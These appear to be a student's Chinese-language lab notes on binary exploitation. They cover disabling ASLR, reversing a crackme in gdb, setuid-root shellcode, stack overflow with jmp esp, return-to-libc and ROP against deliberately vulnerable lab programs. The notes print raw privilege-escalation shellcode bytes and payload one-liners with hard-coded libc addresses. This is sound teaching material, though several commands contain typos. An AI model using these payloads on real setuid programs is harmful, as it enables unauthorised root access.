![image](https://github.com/user-attachments/assets/7f3c41b0-f13f-4bc0-952a-b19da3da6e99)![image](https://github.com/user-attachments/assets/3bd53213-6bfe-4b03-8791-5a1d9ce5c689)Day4
===
關閉ASLR
---
    sysctl -a --pattren randomize
    sysctl -w kernal.randomize_va_space=0
![image](https://github.com/user-attachments/assets/55a72689-b830-4df2-b0c9-99ba9016c66c)

Check Binary
---
    strings ./crackme0x00a|grep GLIBC 檢查檔案資訊
    file crackme0x00a
![image](https://github.com/user-attachments/assets/94504db6-4f69-4356-a535-a9b9e08ee260)
![image](https://github.com/user-attachments/assets/0a47ab25-48c6-4f9c-a951-22e531be0862)

    rabin2拆解檔案內容 rabin2 -z crackme0x00a
![image](https://github.com/user-attachments/assets/916d8ce6-d3c0-4e8e-8677-c093d7a7b13a)

    使用gdb工具進行檔案拆解 gdb crackme0x00a
    
![image](https://github.com/user-attachments/assets/e19147fb-edb6-4dec-8618-0ab95d0bd773)

     disassemble main 
![image](https://github.com/user-attachments/assets/6a4893d2-828a-41ad-bf84-eb122e066542)

    x/s 0x804a024 解出密碼
![image](https://github.com/user-attachments/assets/651b701a-1e4b-490b-8440-666eca76768e)

    設定中斷點並執行
![image](https://github.com/user-attachments/assets/5b9cb403-1d59-4817-bbb5-f39dda6272e2)

    registers資訊，32bit有8個暫存器，64bit有16暫存器
![image](https://github.com/user-attachments/assets/25a6c5f9-d9aa-4564-a819-f83e5d8d7392)

    objectdump -d crackme0x00a or objectdump -d -M intel crackme0x00a
    兩者差異:
    AT&T有百分比，使用()，順序由左到右
![image](https://github.com/user-attachments/assets/7889f175-578d-4f6e-8bee-d13f7a59deb6)
![image](https://github.com/user-attachments/assets/ecc9b364-02c4-46cc-91cb-65ad5679a68e)

shellcode.c編譯&權限
---
    編譯shellcode.c，gcc shellcode.c -o shellcode -z execstack
![image](https://github.com/user-attachments/assets/d2348643-65b5-49db-a3eb-e222cbfad12d)

    執行shellcode
![image](https://github.com/user-attachments/assets/0cc8ebe4-6cfe-4d33-8c42-099e9a1262e1)

    提權&編譯
    加入 
    "\x6a\x17"		
    "\x58"			
    "\x31\xdb"		
    "\xcd\x80"
![image](https://github.com/user-attachments/assets/81e4e9b9-db86-4369-901e-d01c56423dbf)
![image](https://github.com/user-attachments/assets/a0cb0fd6-d96c-4d2e-a3f9-c7b3e9c154fe)

    變更擁有者和執行權限
    sudo chown root:root shellcode
    sudo chmod 4755 shellcode
![image](https://github.com/user-attachments/assets/fea8d6ed-5616-43e9-b6af-fb2b945c1cc4)

    執行確認uid=0(root)
![image](https://github.com/user-attachments/assets/78dcc4d2-c593-4b4b-ae1c-6e9e0d41bae0)

緩衝區益位stack.c
---
    編譯&變更擁有者和權限
    sudo gcc stack.c -o stack -z execstack -fno-stack-protector
    sudo chown root:root stack
    sudo chmod 4755 stack
    execstack 產生一個將堆疊標記為可執行或不可執行的部分
    -fno-stack-protector停用堆疊保護機制。堆疊保護是一項安全功能
![image](https://github.com/user-attachments/assets/9a5495a7-bd64-4f34-b81d-137ecd100c72)
![image](https://github.com/user-attachments/assets/66588ac4-ca39-4068-a785-e9559b93bc95)

    確認程式的保護機制
    checksec
![image](https://github.com/user-attachments/assets/405de152-e622-457f-ae43-a22f15d4bedc)

    反組譯程式碼
    disassemble main
    r
![image](https://github.com/user-attachments/assets/a3b70974-fdd0-4b88-b313-77374af32ad3)

    設定中斷點並找到所需檔名
    b *mian +55
    r
![image](https://github.com/user-attachments/assets/ebbd268b-7a78-43e2-8aad-3d507046e94b)

    建立badfile檔案並執行stack，程式就無報錯
![image](https://github.com/user-attachments/assets/96499010-86b7-4c68-8768-6a24f8ffe981)

    塞值到badfile讓他超出範圍
![image](https://github.com/user-attachments/assets/ed5b17bb-1597-4b8a-9601-8870048f721b)

    找出ret address ESP位置在第42bit
    pattern create 100 badfile
    r
    pattern search
![image](https://github.com/user-attachments/assets/1f3a871b-cf43-4a11-af79-1e3073ecbb10)
![image](https://github.com/user-attachments/assets/bc7a9aba-f6fe-418a-95d9-9e40ca0ec079)

    確認ret address 有塞BBBB的值
![image](https://github.com/user-attachments/assets/ef0644c7-485e-4b11-a945-9e1b38f28a41)
![image](https://github.com/user-attachments/assets/51cadb28-e0cb-494e-b104-9ca1835b2dac)

    將shellcode機器語言塞進去C的位置
    cat shellcode.c | grep '"' | cut -d'"' -f2,4 | tr -d '"' | tr -d '\n'
![image](https://github.com/user-attachments/assets/caa04db4-657e-42c9-b7be-3aa4cad186b1)
![image](https://github.com/user-attachments/assets/f5d740a9-287d-44b0-854d-f06f1c434198)
![image](https://github.com/user-attachments/assets/9ec9b776-0f34-43c7-85d7-03e63f12b028)

    利用jmpcall去執行shellcode
    vmmap
    jmpcall esp /lib/i386-linux-gnu/libc-2.23.so
![image](https://github.com/user-attachments/assets/18d71147-3075-4e68-8f7e-6ad980b72906)

    將找到的jump值塞入B的位置並執行stack，確認uid=0(root)
![image](https://github.com/user-attachments/assets/6784994b-5226-48fa-b7e9-5d4e710d8e21)

Return to Libc
---
   retlib.c line #11 40 > 140 
![image](https://github.com/user-attachments/assets/b25feb76-1f26-429d-9fc1-7789e8a89458)

    編譯retlib並變更擁有者和權限
    sudo gcc retlib.c -o retlib -fno-stack-protector -z noexecstack
    sudo chown root:root retlib
    sudo chmod 4755 retlib
![image](https://github.com/user-attachments/assets/6363d2ad-254d-4c8d-961d-6135138c4290)

    gdb -q ./retlib並確認目前的安全機制
![image](https://github.com/user-attachments/assets/42bf296f-1029-4a80-a3b9-456c3b9f61ac)

    反組譯程式碼
    disassemble main
    disassemble bof
![image](https://github.com/user-attachments/assets/078d312b-665b-42f6-ab18-ac6d1f0da6ce)
![image](https://github.com/user-attachments/assets/bf42fe1b-d5e0-44e7-bd66-513fe8fb3b07)

    塞值到badfile
    python -c 'print "A"*100' > badfile
![image](https://github.com/user-attachments/assets/d8c5d79e-4dcd-452c-b60d-b3e1932f26bf)

    找出ret address位置在第24bit
    pattern create 100 badfile
    r
    pattern search
![image](https://github.com/user-attachments/assets/9323d151-3d74-4a99-96fc-22ecbfc3d098)

    把24bit塞滿A確認ret address在BBBB的位置
    python -c 'print "A"*24 + "BBBB" + "C"*8' > badfile
    r
![image](https://github.com/user-attachments/assets/f56d03e9-a95f-4291-ba9f-ff2d950b5122)
![image](https://github.com/user-attachments/assets/2b1c9b3e-ad21-45fc-9c6a-d9660ef713f1)

    因有NX保護，無法在其他區域執行程式碼，所以要將ret address指到/bin/sh
    p system
    p exit
    find /bin/sh
![image](https://github.com/user-attachments/assets/d9d1b723-5667-4a89-bfd0-34074a0e55f6)

    將找到的機器語言加入到badfile並執行
    權限目前還未提升到root
    python -c 'print "A"*24 + "\xb0\xfd\xe3\xb7" + "\xe0\x39\xe3\xb7" +"\x2b\x0b\xf6\xb7"' > badfile
    ./retlib
![image](https://github.com/user-attachments/assets/7078dd06-c7f2-4d3f-8cd8-ce23cff82a0b)

ROP
---
    找到uid、gid、rop機器語言的值
![image](https://github.com/user-attachments/assets/b41c79f3-911e-49a0-9939-eb09b2b6eae9)

    將找到的值和原本的值組合在一起
    python -c 'print "A"*24 + "\xc0\x63\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00"     + "\x40\x64\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00" + "\xb0\xfd\xe3\xb7" +     "\xe0\x39\xe3\xb7" + "\x2b\x0b\xf6\xb7"' > badfile
    ./retlib
![image](https://github.com/user-attachments/assets/00357a78-1916-499b-a588-9104ae49dc26)

補充練習
---
    安裝peda
    https://github.com/longld/peda
    git clone https://github.com/longld/peda.git ~/peda
    echo "source ~/peda/peda.py" >> ~/.gdbinit

    challenge-one
    ./challenge-one
![image](https://github.com/user-attachments/assets/fda9b0c9-72b3-4da5-9a0e-476a8d1b3a8c)

    確認檔案資訊
    file challenge-one
![image](https://github.com/user-attachments/assets/ed725ee2-0d8b-41e7-b09d-c0583d543347)

    確認程式碼開啟的防護機制
    gdb ./challenge-one
    checksec
![image](https://github.com/user-attachments/assets/0f2254a3-8d93-4222-885c-2d8dac83a4b7)

    反組譯程式碼
    disassemble main
![image](https://github.com/user-attachments/assets/c74ad230-7adf-48fc-8ae4-8aa83f192cf5)

    塞值讓程式報錯
    pattern create 100 
    r
![image](https://github.com/user-attachments/assets/9db1305a-a110-4e8e-95f8-e5f0c75f6d59)

    找到ret address位置在第44bit
    pattern search
![image](https://github.com/user-attachments/assets/64dff4be-092d-4818-a461-2f125ba753fb)

    編輯exp_challenge-one.py，找出堆疊的起始值並替換檔案內的植，程式碼用pyton2執行
![image](https://github.com/user-attachments/assets/8a30e97c-62cf-4713-afa2-25108c7d7eac)
![image](https://github.com/user-attachments/assets/dc072aec-4fe3-43d1-b0a3-dc6d8628629d)

    執行程式碼
    while true; do (python2 exp_challenge-one.py; python2 -c 'import sys;sys.stdout.write("
    \x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\
    x69\x6e\x89\xe3\xcd\x80")';cat) | ./challenge-one; done
![image](https://github.com/user-attachments/assets/b028ca67-74cf-4166-975f-96cdd9084b5b)

------------------------------------------------------

    level-two
    ./level-two
![image](https://github.com/user-attachments/assets/b1241eda-6e2f-442b-beec-d2b1c6d5f9ae)

    確認檔案資訊
    file level-two
![image](https://github.com/user-attachments/assets/99bcc9f8-cb08-4e61-8bb5-ba9c5f10dcaf)

    確認程式碼保護機制
    gdb ./level-two
    checksec
![image](https://github.com/user-attachments/assets/544eabf1-840a-497e-af97-f00e1fc43dfc)

    塞值讓程式碼報錯
    pattern create 500
    r
![image](https://github.com/user-attachments/assets/f29155df-1430-4c1a-90df-0ec7256f3ed7)

    找到ret address位置在140bit
    pattern search
![image](https://github.com/user-attachments/assets/add4a4c3-94b1-4dbb-824a-85ca55f0cd55)

    找level-two，uid、gid、system、exit、/bin/sh機器語言的值，利用寫好的py執行
    p setuid
    p setgid
    p system
    p exit
    find /bin/sh
![image](https://github.com/user-attachments/assets/1e974e99-7bfd-4ad0-b7f8-2db7d534f0fd)
![image](https://github.com/user-attachments/assets/b10ec0c0-7d75-46d5-9621-ce88ba8895d6)

    替換py裡面的值
![image](https://github.com/user-attachments/assets/111aab16-a049-4b01-8371-93c568428e13)

    執行程式碼
    while true; do (python2 ./exp_leveltwo.py; cat) | ./level-two; done
    

    



    

